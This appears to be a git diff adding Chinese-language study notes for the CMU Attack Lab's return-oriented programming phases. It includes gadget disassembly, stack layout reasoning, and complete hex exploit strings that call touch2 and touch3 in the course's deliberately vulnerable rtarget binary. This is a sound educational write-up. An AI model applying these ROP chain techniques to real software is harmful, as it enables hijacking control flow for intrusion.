@@ -336,7 +336,167 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
 ```
+# phase4
+重复phase2的攻击过程，但要是使用gadgets
 
-# touch4
+> Gadgets是指一些小的、独立的机器指令段。攻击者可以组合这些指令来构建一个更复杂的攻击。例如，这些gadgets通常由一些基本的x86-64指令（如movq、popq、ret等）组成。
 
-# touch5
+```
+movq $0x59b997fa, %rdi
+pushq $0x4017ec
+ret
+```
+0x4017ec
+0x59b997fa
+pop %rdi; ret( pop -> pc and jmp)
+
+在start farm到end farm 中使用相应的gadget
+
+
+step4. movq %rax, %rdi -- 48 89 c7
+step3. ret -- c3
+
+```
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq     
+```
+**4019C5**
+
+cookie value = 0x59b997fa
+
+step2. popq, %rax -- rax = cookie, 58
+step1. ret --> jmpto gadget1
+
+```
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq 
+```
+
+**0x4019AB**
+
+```
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+ab 19 40 00 00 00 00 00 
+fa 97 b9 59 00 00 00 00 
+c5 19 40 00 00 00 00 00 
+```
+
+# phase5
+invoke touch3 with 指向字符串cookie的指针
+
+cookie放在一个固定位置?no, 需要通过rsp+offset获取位置
+
+**0x401AAD**
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 // getbuf 40B
+
+ad 1a 40 00 00 00 00 00 // movq %rsp, %rax; retq
+00 00 00 00 00 00 00 00 // pop %xxx;retq
+00 00 00 00 00 00 00 00 // offset = %xxx
+00 00 00 00 00 00 00 00 // %rdi = %rsp + %xxx ==> leaq指令可以实现
+fa 18 40 00 00 00 00 00 // touch3 addr
+35 39 62 39 39 37 66 61 // cookie ascii
+```
+
+leaq a(b, c, d), %rax 先计算地址a + b + c * d，然后把最终地址载到寄存器rax中。
+
+```
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+```
+
+%rax = %rdi + %rsi * 1
+
+在phase4可知，只有pop %rax
+```
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq 
+```
+
+```
+ad 1a 40 00 00 00 00 00 // movq %rsp, %rax; retq
+c5 19 40 00 00 00 00 00 // movq %rax, %rdi; retq ==> rdi = rsp (这里才是rsp)
+
+ab 19 40 00 00 00 00 00 // pop %rax;retq   ==> rax = offset
+48 00 00 00 00 00 00 00 // offset 
+
+dd 19 40 00 00 00 00 00 // %edx = %eax， movl %eax, %edx; retq
+70 1a 40 00 00 00 00 00 // %ecx = %edx;  movl %edx, %ecx; retq
+13 1a 40 00 00 00 00 00 // %rsi = %ecx;  movl %ecx, %esi; retq 倒着找快一点
+
+d6 19 40 00 00 00 00 00 // %rax = %rdi + %rsi * 1
+c5 19 40 00 00 00 00 00 // %rdi = %rax; movq %rax, %rdi; retq
+
+fa 18 40 00 00 00 00 00 // touch3 addr
+35 39 62 39 39 37 66 61 // cookie ascii
+```
+
+offset = 8*9 = 72 = 0x48
+
+```
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+```
+0x4019ab
+
+```
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+```
+0x4019c5
+
+```
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3   
+```
+0x4019c5
+
+```
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3                   	retq  
+```
+0x4019dd
+
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+  401a17:	c3                   	retq   
+
+  0x401a13
+
+0000000000401a6e <setval_167>:
+  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
+  401a74:	c3                   	retq   
+ 0x401a70
+
+完整的输入
+```
+```
+
+```
+unix> ./rtarget -q -i t5raw.txt 
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+```
